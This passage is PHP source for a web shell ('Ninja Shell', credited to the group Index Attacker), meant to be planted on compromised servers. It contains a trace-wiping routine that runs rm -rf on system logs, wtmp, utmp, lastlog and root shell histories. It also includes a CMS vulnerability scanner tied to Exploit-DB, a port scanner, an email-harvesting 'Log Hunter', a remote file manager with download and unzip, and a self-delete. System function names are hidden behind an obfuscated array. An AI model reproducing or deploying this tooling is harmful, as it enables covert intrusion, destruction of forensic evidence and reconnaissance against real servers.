					echo '<br><center><b><span>Delete Logs ( For Safe )</span></b><center><br>';
					echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";
					exec("rm -rf /tmp/logs");
					exec("rm -rf /root/.ksh_history");
					exec("rm -rf /root/.bash_history");
					exec("rm -rf /root/.bash_logout");
					exec("rm -rf /usr/local/apache/logs");
					exec("rm -rf /usr/local/apache/log");
					exec("rm -rf /var/apache/logs");
					exec("rm -rf /var/apache/log");
					exec("rm -rf /var/run/utmp");
					exec("rm -rf /var/logs");
					exec("rm -rf /var/log");
					exec("rm -rf /var/adm");
					exec("rm -rf /etc/wtmp");
					exec("rm -rf /etc/utmp");
					exec("rm -rf $HISTFILE");
					exec("rm -rf /var/log/lastlog");
					exec("rm -rf /var/log/wtmp");

					shell_exec("rm -rf /tmp/logs");
					shell_exec("rm -rf /root/.ksh_history");
					shell_exec("rm -rf /root/.bash_history");
					shell_exec("rm -rf /root/.bash_logout");
					shell_exec("rm -rf /usr/local/apache/logs");
					shell_exec("rm -rf /usr/local/apache/log");
					shell_exec("rm -rf /var/apache/logs");
					shell_exec("rm -rf /var/apache/log");
					shell_exec("rm -rf /var/run/utmp");
					shell_exec("rm -rf /var/logs");
					shell_exec("rm -rf /var/log");
					shell_exec("rm -rf /var/adm");
					shell_exec("rm -rf /etc/wtmp");
					shell_exec("rm -rf /etc/utmp");
					shell_exec("rm -rf $HISTFILE");
					shell_exec("rm -rf /var/log/lastlog");
					shell_exec("rm -rf /var/log/wtmp");

					passthru("rm -rf /tmp/logs");
					passthru("rm -rf /root/.ksh_history");
					passthru("rm -rf /root/.bash_history");
					passthru("rm -rf /root/.bash_logout");
					passthru("rm -rf /usr/local/apache/logs");
					passthru("rm -rf /usr/local/apache/log");
					passthru("rm -rf /var/apache/logs");
					passthru("rm -rf /var/apache/log");
					passthru("rm -rf /var/run/utmp");
					passthru("rm -rf /var/logs");
					passthru("rm -rf /var/log");
					passthru("rm -rf /var/adm");
					passthru("rm -rf /etc/wtmp");
					passthru("rm -rf /etc/utmp");
					passthru("rm -rf $HISTFILE");
					passthru("rm -rf /var/log/lastlog");
					passthru("rm -rf /var/log/wtmp");


					system("rm -rf /tmp/logs");
					sleep(2);
					echo '<br>Deleting .../tmp/logs ';
					sleep(2);

					system("rm -rf /root/.bash_history");
					sleep(2);
					echo '<p>Deleting .../root/.bash_history </p>';

					system("rm -rf /root/.ksh_history");
					sleep(2);
					echo '<p>Deleting .../root/.ksh_history </p>';

					system("rm -rf /root/.bash_logout");
					sleep(2);
					echo '<p>Deleting .../root/.bash_logout </p>';

					system("rm -rf /usr/local/apache/logs");
					sleep(2);
					echo '<p>Deleting .../usr/local/apache/logs </p>';

					system("rm -rf /usr/local/apache/log");
					sleep(2);
					echo '<p>Deleting .../usr/local/apache/log </p>';

					system("rm -rf /var/apache/logs");
					sleep(2);
					echo '<p>Deleting .../var/apache/logs </p>';

					system("rm -rf /var/apache/log");
					sleep(2);
					echo '<p>Deleting .../var/apache/log </p>';

					system("rm -rf /var/run/utmp");
					sleep(2);
					echo '<p>Deleting .../var/run/utmp </p>';

					system("rm -rf /var/logs");
					sleep(2);
					echo '<p>Deleting .../var/logs </p>';

					system("rm -rf /var/log");
					sleep(2);
					echo '<p>Deleting .../var/log </p>';

					system("rm -rf /var/adm");
					sleep(2);
					echo '<p>Deleting .../var/adm </p>';

					system("rm -rf /etc/wtmp");
					sleep(2);
					echo '<p>Deleting .../etc/wtmp </p>';

					system("rm -rf /etc/utmp");
					sleep(2);
					echo '<p>Deleting .../etc/utmp </p>';

					system("rm -rf $HISTFILE");
					sleep(2);
					echo '<p>Deleting ...$HISTFILE </p>';

					system("rm -rf /var/log/lastlog");
					sleep(2);
					echo '<p>Deleting .../var/log/lastlog </p>';

					system("rm -rf /var/log/wtmp");
					sleep(2);
					echo '<p>Deleting .../var/log/wtmp </p>';

					sleep(4);

					echo '<br><br><p>Your Traces Has Been Successfully Deleting ...From the Server';
					echo "</td></tr></table>";
				} elseif (isset($_GET[hex('scanner')])) {
					echo "<hr><br>";
					echo "<center><h2>Scanner Ninja Shell</h2></center><br>";
					echo "<form method = 'POST'>
						<center>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('cmsvuln') . "' style='width: 250px;' height='10'><center>CMS Vulnerability Scanner</center></a>
						</div>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('port-scanner') . "' style='width: 250px;' height='10'><center>Port Scanner</center></a>
						</div>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('logs-scanner') . "' style='width: 250px;' height='10'><center>Logs Scanner</center></a>
						</div>
						</div></center></form>";
					echo "<hr>";
				} elseif (isset($_GET[hex('cmsvuln')])) {
					@set_time_limit(0);
					@error_reporting(0);
					// Script Functions , start ..!
					function ask_exploit_db($component)
					{
						$exploitdb = "http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$component&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=";
						$result = @file_get_contents($exploitdb);
						if (eregi("No results", $result)) {
							echo "<center><td>Gak ada</td><td><a href='http://www.google.com/search?hl=en&q=download+$component'>Download</a></td></tr>";
						} else {
							echo "<td><a href='$exploitdb'>Klik Ini..!</a></td><td><--</td></tr>";
						}
					}
					/**************************************************************/
					/* Joomla Conf */
					function get_components($site)
					{
						$source = @file_get_contents($site);
						preg_match_all('{option,(.*?)/}i', $source, $f);
						preg_match_all('{option=(.*?)(&amp;|&|")}i', $source, $f2);
						preg_match_all('{/components/(.*?)/}i', $source, $f3);
						$arz = array_merge($f2[1], $f[1], $f3[1]);
						$coms = array();
						if (count($arz) == 0) {
							echo "<tr><td style='border-color:white' colspan=3>[~] Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
						}
						foreach (array_unique($arz) as $x) {
							$coms[] = $x;
						}
						foreach ($coms as $comm) {
							echo "<tr><td>$comm</td>";
							ask_exploit_db($comm);
						}
					}
					/**************************************************************/
					/* WP Conf */
					function get_plugins($site)
					{
						$source = @file_get_contents($site);
						preg_match_all("#/plugins/(.*?)/#i", $source, $f);
						$plugins = array_unique($f[1]);
						if (count($plugins) == 0) {
							echo "<tr><td style='border-color:white' colspan=1>[~]  Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
						}
						foreach ($plugins as $plugin) {
							echo "<tr><td>$plugin</td>";
							ask_exploit_db($plugin);
						}
					}
					/**************************************************************/
					/* Nuke's Conf */
					function get_numod($site)
					{
						$source = @file_get_contents($site);
						preg_match_all('{?name=(.*?)/}i', $source, $f);
						preg_match_all('{?name=(.*?)(&amp;|&|l_op=")}i', $source, $f2);
						preg_match_all('{/modules/(.*?)/}i', $source, $f3);
						$arz = array_merge($f2[1], $f[1], $f3[1]);
						$coms = array();
						if (count($arz) == 0) {
							echo "<tr><td style='border-color:white' colspan=3>[~]  Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
						}
						foreach (array_unique($arz) as $x) {
							$coms[] = $x;
						}
						foreach ($coms as $nmod) {
							echo "<tr><td>$nmod</td>";
							ask_exploit_db($nmod);
						}
					}
					/*****************************************************/
					/* Xoops Conf */
					function get_xoomod($site)
					{
						$source = @file_get_contents($site);
						preg_match_all('{/modules/(.*?)/}i', $source, $f);
						$arz = array_merge($f[1]);
						$coms = array();
						if (count($arz) == 0) {
							echo "<tr><td style='border-color:white' colspan=3>[~]  Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
						}
						foreach (array_unique($arz) as $x) {
							$coms[] = $x;
						}
						foreach ($coms as $xmod) {
							echo "<tr><td>$xmod</td>";
							ask_exploit_db($xmod);
						}
					}
					/**************************************************************/
					/* Header */
					function t_header($site)
					{
						echo '<br><hr color="white"><br><table align="center" border="1" style="border-color=white; text-align:left;" width="50%" cellspacing="1" cellpadding="5">';
						echo '
<tr>
<td style="border-color=white">Site : <a href="' . $site . '">' . $site . '</a></td>
<td style="border-color=white">Exploit-db</b></td>
<td style="border-color=white">Exploit it !</td>
</tr>
';
					}
					echo "<center>";
					echo '<hr><br>
<h2>CMS Vulnerability Scanner Ninja Shell</h2>
<form method="POST" action=""  class="header-izz">
    <p>Link&nbsp&nbsp<input type="text" style="border:0;border-bottom:1px solid #292929; width:500px;" name="site" value="http://127.0.0.1/" class = "form-control" >
    <br><br>
    CMS
    &nbsp&nbsp&nbsp<select class = "form-control"  name="pilihan" style="border:0;border-bottom:1px solid #292929; width:500px;">
    <option>Wordpress</option>
    <option>Joomla</option>
    <option>Nukes</option>
    <option>Xoops</option> 
    </select><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
    <input class = "form-control" type="submit" style="width: 150px; height: 40px; border-color=white;margin:10px 2px 0 2px;" value="Scan" class="kotak"></p>
</form></center><hr><br>';
					// Start Scan :P :P ...
					if ($_POST) {
						$site = strip_tags(trim($_POST['site']));
						t_header($site);
						echo $x01 = ($_POST['pilihan'] == "Wordpress") ? get_plugins($site) : "";
						echo $x02 = ($_POST['pilihan'] == "Joomla") ? get_components($site) : "";
						echo $x03 = ($_POST['pilihan'] == "Nuke's") ? get_numod($site) : "";
						echo $x04 = ($_POST['pilihan'] == "Xoops") ? get_xoomod($site) : "";
					}
				} elseif (isset($_GET[hex('port-scanner')])) {
					echo "<hr><br><center>";
					echo '<table><h2>Ports Scanner Ninja Shell</h2><td>';
					echo '<div class="content">';
					echo '<form action="" method="post">';

					if (isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])) {
						$start = strip_tags($_POST['start']);
						$end = strip_tags($_POST['end']);
						$host = strip_tags($_POST['host']);
						for ($i = $start; $i <= $end; $i++) {
							$fp = @fsockopen($host, $i, $errno, $errstr, 3);
							if ($fp) {
								echo 'Port ' . $i . ' is <font color=green>open</font><br>';
							}
							flush();
						}
					} else {
						echo '<br /><br /><center><input type="hidden" name="a" value="PortScanner"><input type="hidden" name=p1><input type="hidden" name="p2">
		              <input type="hidden" name="c" value="' . htmlspecialchars($GLOBALS['cwd']) . '">
		              <input type="hidden" name="charset" value="' . (isset($_POST['charset']) ? $_POST['charset'] : '') . '">
		              Host:<br> <input class = "form-control" type="text" name="host" value="localhost"/><br /><br />
		              Port start: <br><input class = "form-control type="text" name="start" value="0"/><br /><br />
		              Port end: <br><input type="text" name="end" value="5000"/><br /><br />
		              <input class = "form-control type="submit" value="Scan Ports" />
		              </form></center><br /><br />';
						echo "</center>";
						echo '</div></table></td><hr><br>';
					}
				} elseif (isset($_GET[hex('logs-scanner')])) {

					echo '<hr><br>';
					echo "<Center>\n";
					echo "<h2>Log Hunter Ninja Shell</h2>";
					echo "<form action=\"\" method=\"post\">\n";
					?><br>Dir :<input class="form-control" style="width: 250px;" type="text" value="<?= getcwd(); ?>" name="shc_dir"><?php
																																		echo "<br>";
																																		echo "<input class = 'form-control' style='width:250px;' type=\"submit\" name=\"submit\" value=\"Scan Now!\"/>\n";
																																		echo "</form><hr><br>\n";
																																		echo "<pre style=\"text-align: left;\">\n";
																																		error_reporting(0);
																																		/*
Name    : Log Hunter (Grab Email)
Date    : 26/03/2016 05:53 PM
Author  : ./Exorcism1337
*/


																																		if ($_POST['submit']) {
																																			function tampilkan($shcdirs)
																																			{
																																				foreach (scandir($shcdirs) as $shc) {
																																					if ($shc != '.' && $shc != '..') {
																																						$shc = $shcdirs . DIRECTORY_SEPARATOR . $shc;
																																						if (!is_dir($shc) && !eregi("css", $shc)) {

																																							$fgt    = file_get_contents($shc);
																																							$ifgt   = exif_read_data($shc);
																																							$jembut = "COMPUTED";
																																							$taik   = "UserComment";
																																							$shcm = "/mail['(']/";
																																							if ($ifgt[$jembut][$taik]) {
																																								echo "[<font color=#00FFD0>Stegano</font>] <font color=#2196F3>" . $shc . "</font><br>";
																																							}
																																							preg_match_all('#[A-Z0-9a-z._%+-]+@[A-Za-z0-9.+-]+#', $fgt, $cocok);
																																							$hcs  = "/base64_decode/";
																																							$exif = "/exif_read_data/";
																																							preg_match($shcm, addslashes($fgt), $mailshc);
																																							preg_match($hcs,  addslashes($fgt), $shcmar);
																																							preg_match($exif, addslashes($fgt), $shcxif);
																																							if (eregi('HTTP Cookie File', $fgt) || eregi('PHP Warning:', $fgt)) {
																																							}
																																							if (eregi('tmp_name', $fgt)) {
																																								echo "[<font color=#FAFF14>Uploader</font>] <font color=#2196F3>" . $shc . "</font><br>";
																																							}
																																							if ($shcmar[0]) {
																																								echo "[<font color=#FF3D00>Base64</font>] <font color=#2196F3>" . $shc . "</font><br>";
																																							}
																																							if ($mailshc[0]) {
																																								echo "[<font color=#E6004E>MailFunc</font>] <font color=#2196F3>" . $shc . "</font><br>";
																																							}
																																							if ($shcxif[0]) {
																																								echo "[<font color=#00FFD0>Stegano</font>] <font color=#2196F3>" . $shc . "</font> </font><font color=red>{Manual Check}</font><br>";
																																							}
																																							if (eregi("js", $shc)) {
																																								echo "[<font color=red>Javascript</font>] <font color=#2196F3>" . $shc . "</font> { <a href=http://www.unphp.net target=_blank>CheckJS</a> }<br>";
																																							}
																																							if ($cocok[0]) {
																																								foreach ($cocok[0] as $key => $shcmail) {
																																									if (filter_var($shcmail, FILTER_VALIDATE_EMAIL)) {
																																										echo "[<font color=greenyellow>SendMail</font>] <font color=#2196F3>" . $shc . "</font> { " . $shcmail . " }<br>";
																																									}
																																								}
																																							}
																																						} else {
																																							tampilkan($shc);
																																						}
																																					}
																																				}
																																			}
																																			tampilkan($_POST['shc_dir']);
																																		}
																																		echo "</pre>\n";
																																		echo "</Center>\n";
																																		echo "</div>";
																																	} elseif (isset($_GET[hex('about')])) {

																																		echo "<hr><br><center><h2>About Index Attacker</h2>";
																																		echo "Thanks For Taking Our Shell Today without you all we are means nothing :) <br><br>";
																																		echo "visit us : <a href = 'https://www.indexattacker.web.id' target = 'blank' class= 'form-control' style = 'width:250px;'>Pwnz!</a> <br><br>";
																																		echo "We Are : <br>
			    Jinzo - Lord.Acil - SQL47.id - ./Exorcism1337 - Security_Hunterz - CrazyClownZz - Lastcar_Jihood - Mr.IP - Sy3rifb0y - Mr.Syn10_10 - CLAY97 - Devil!Hunter <br><br>
				";
																																		echo "Greetz : <br>IndoXploit - Xai Syndicate - Typical Idiot Security - Con7ext";
																																		echo "<hr><br></center>";
																																	} elseif (isset($_GET[hex('killself')])) {
																																		unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
																																		@unlink(__FILE__);
																																		print "<script>window.location='?';</script>";
																																	} elseif (isset($_GET[hex('logout')])) {
																																		unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
																																		print "<script>window.location='?';</script>";
																																	} elseif (isset($_GET["n"])) {
																																		echo $a_ . '+FILE' . $b_ . '
									<form action="" method="post">
										<input name="n" autocomplete="off" class="form-control col-md-3" type="text" value="">
										' . $d_ . '
								' . $c_;
																																		if (isset($_POST["n"])) {
																																			if (!$GNJ[25]($_POST["n"])) {
																																				ER();
																																			} else {
																																				OK();
																																			}
																																		}
																																	} elseif (isset($_GET["r"])) {
																																		echo $a_ . uhex($_GET["r"]) . $b_ . '
									<form action="" method="post">
										<input name="r" autocomplete="off" class="form-control col-md-3" type="text" value="' . uhex($_GET["r"]) . '">
										' . $d_ . '
								' . $c_;
																																		if (isset($_POST["r"])) {
																																			if ($GNJ[26]($_POST["r"])) {
																																				ER();
																																			} else {
																																				if ($GNJ[27](uhex($_GET["r"]), $_POST["r"])) {
																																					OK();
																																				} else {
																																					ER();
																																				}
																																			}
																																		}
																																	} elseif (isset($_GET["z"])) {
																																		$zip = new ZipArchive;
																																		$res = $zip->open(uhex($_GET["z"]));
																																		if ($res === TRUE) {
																																			$zip->extractTo(uhex($_GET["d"]));
																																			$zip->close();
																																			OK();
																																		} else {
																																			ER();
																																		}
																																	} else {

																																		echo '<table class = "table table-bordered mt-3" >
						<thead>
							<tr>
								<th><center> NAME </center></th>
								<th><center> TYPE </center></th>
								<th><center> SIZE </center></th>
								<th><center> LAST MODIFIED </center></th>
								<th><center> OWNER\GROUP </center></th>
								<th><center> PERMISSION </center></th>
								<th><center> ACTION </center></th>
							</tr>
						</thead>
						<tbody>
							
						';

																																		$h = "";
																																		$j = "";
																																		$w = $GNJ[13]($d);
																																		if ($GNJ[28]($w) || $GNJ[29]($w)) {
																																			foreach ($w as $c) {
																																				$e = $GNJ[14]("\\", "/", $d);
																																				if (!$GNJ[30]($c, ".zip")) {
																																					$zi = '';
																																				} else {
																																					$zi = '<a href="?d=' . hex($e) . '&z=' . hex($c) . '">U</a>';
																																				}
																																				if ($GNJ[31]("$d/$c")) {
																																					$o = "";
																																				} elseif (!$GNJ[32]("$d/$c")) {
																																					$o = " h";
																																				} else {
																																					$o = " w";
																																				}
																																				$s = $GNJ[34]("$d/$c") / 1024;
																																				$s = round($s, 3);
																																				if ($s >= 1024) {
																																					$s = round($s / 1024, 2) . " MB";
																																				} else {
																																					$s = $s . " KB";
																																				}
																																				if (($c != ".") && ($c != "..")) {
																																					($GNJ[8]("$d/$c")) ?
																																						$h .= '<tr class="r">
							<td>
								<img src = "https://cdn0.iconfinder.com/data/icons/iconico-3/1024/63.png" width = "20px" height = "20px">
								<a class="ajx" href="?d=' . hex($e) . hex("/" . $c) . '">' . $c . '</a>
							</td>
							<td><center>Dir</center></td>
							<td class="x">
								<center>-</center>
							</td>
							
							<td class="x">
							<center>
								<a class="ajx" href="?d=' . hex($e) . '&t=' . hex($c) . '">' . $GNJ[20]("F d Y g:i:s", $GNJ[21]("$d/$c")) . '</a>
								</center>
							</td>
							<td class = "x">
							<center>
							' . $dirinfo["owner"] . DIRECTORY_SEPARATOR . $dirinfo["group"] . '
							</center>
							</td>
							<td class="x">
							<center>
								<a class="ajx' . $o . '" href="?d=' . hex($e) . '&k=' . hex($c) . '">' . x("$d/$c") . '</a>
							</center>
							</td>
							<td class="x">
							<center>
								<a class="ajx" href="?d=' . hex($e) . '&r=' . hex($c) . '">Rename</a>
								<a class="ajx" href="?d=' . hex($e) . '&x=' . hex($c) . '">Delete</a>
								</center>
							</td>
						</tr>
						
						'
																																						:
																																						$j .= '<tr class="r">
							<td>
							
								<img src = "https://img.icons8.com/ios/104/000000/file-filled.png" width = "20px" height = "20px">
								<a class="ajx" href="?d=' . hex($e) . '&s=' . hex($c) . '">' . $c . '</a>
								
							</td>
							<td>
							<center>
							File
							</center>
							</td>
							<td class="x">
							<center>
								' . $s . '
								</center>
							</td>
							<td class="x">
							<center>
								<a class="ajx" href="?d=' . hex($e) . '&t=' . hex($c) . '">' . $GNJ[20]("F d Y g:i:s", $GNJ[21]("$d/$c")) . '</a>
								</center>
							</td>	
							<td>
							<center>
							' . $dirinfo["owner"] . DIRECTORY_SEPARATOR . $dirinfo["group"] . '
							</center>
							</td>
								<td class="x">
								<center>
							<a class="ajx' . $o . '" href="?d=' . hex($e) . '&k=' . hex($c) . '">' . x("$d/$c") . '</a>
							</center>
							</td>
							
							<td class="x">
								<center>
								<a class="ajx" href="?d=' . hex($e) . '&e=' . hex($c) . '">Edit</a>
								<a class="ajx" href="?d=' . hex($e) . '&r=' . hex($c) . '">Rename</a>
								<a href="?d=' . hex($e) . '&g=' . hex($c) . '">Download</a>
								' . $zi . '
								<a class="ajx" href="?d=' . hex($e) . '&x=' . hex($c) . '">Delete</a>
								</center>
							</td>
						</tr>
						
						';
																																				}
																																			}
																																		}

																																		echo $h;
																																		echo $j;
																																		echo '</tbody>
					
				</table>';
																																	}
																																		?>

				<footer class="x">
					<center>&copy; Author : TheAlmightyZeus , Design : Con7ext | Recoded By ./Exorcism1337 - Index Attacker ~ Indonesian Hacker Rulez </center>
				</footer>
				<?php
				if (isset($_GET["1"])) {
					echo $f;
				} elseif (isset($_GET["0"])) {
					echo $g;
				} else {
					NULL;
				}
				?>
				<script>
					$(".ajx").click(function(t) {
						t.preventDefault();
						var e = $(this).attr("href");
						history.pushState("", "", e), $.get(e, function(t) {
							$("body").html(t)
						})
					});
				</script>
	</body>

	</html>
	<?php
	function rec($j)
	{
		global $GNJ;
		if (trim(pathinfo($j, PATHINFO_BASENAME), '.') === '') {
			return;
		}
		if ($GNJ[8]($j)) {
			array_map('rec', glob($j . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
			$GNJ[35]($j);
		} else {
			$GNJ[10]($j);
		}
	}
	function dre($y1, $y2)
	{
		global $GNJ;
		ob_start();
		$GNJ[16]($y1($y2));
		return $GNJ[36]();
	}
	function hex($n)
	{
		$y = '';
		for ($i = 0; $i < strlen($n); $i++) {
			$y .= dechex(ord($n[$i]));
		}
		return $y;
	}
	function uhex($y)
	{
		$n = '';
		for ($i = 0; $i < strlen($y) - 1; $i += 2) {
			$n .= chr(hexdec($y[$i] . $y[$i + 1]));
		}
		return $n;
	}
	function OK()
	{
		global $GNJ, $d;
		$GNJ[38]($GNJ[9]);
		header("Location: ?d=" . hex($d) . "&1");
		exit();
	}
	function ER()
	{
		global $GNJ, $d;
		$GNJ[38]($GNJ[9]);
		header("Location: ?d=" . hex($d) . "&0");
		exit();
	}
	function x($c)
	{
		global $GNJ;
		$x = $GNJ[24]($c);
		if (($x & 0xC000) == 0xC000) {
			$u = "s";
		} elseif (($x & 0xA000) == 0xA000) {
			$u = "l";
		} elseif (($x & 0x8000) == 0x8000) {
			$u = "-";
		} elseif (($x & 0x6000) == 0x6000) {
			$u = "b";
		} elseif (($x & 0x4000) == 0x4000) {
			$u = "d";
		} elseif (($x & 0x2000) == 0x2000) {
			$u = "c";
		} elseif (($x & 0x1000) == 0x1000) {
			$u = "p";
		} else {
			$u = "u";
		}
		$u .= (($x & 0x0100) ? "r" : "-");
		$u .= (($x & 0x0080) ? "w" : "-");
		$u .= (($x & 0x0040) ? (($x & 0x0800) ? "s" : "x") : (($x & 0x0800) ? "S" : "-"));
		$u .= (($x & 0x0020) ? "r" : "-");
		$u .= (($x & 0x0010) ? "w" : "-");
		$u .= (($x & 0x0008) ? (($x & 0x0400) ? "s" : "x") : (($x & 0x0400) ? "S" : "-"));
		$u .= (($x & 0x0004) ? "r" : "-");
		$u .= (($x & 0x0002) ? "w" : "-");
		$u .= (($x & 0x0001) ? (($x & 0x0200) ? "t" : "x") : (($x & 0x0200) ? "T" : "-"));
		return $u;
	}
	if (isset($_GET["g"])) {
		$GNJ[38]($GNJ[9]);
		header("Content-Type: application/octet-stream");
		header("Content-Transfer-Encoding: Binary");
		header("Content-Length: " . $GNJ[34](uhex($_GET["g"])));
		header("Content-disposition: attachment; filename=\"" . uhex($_GET["g"]) . "\"");
		$GNJ[37](uhex($_GET["g"]));
	}

	?>
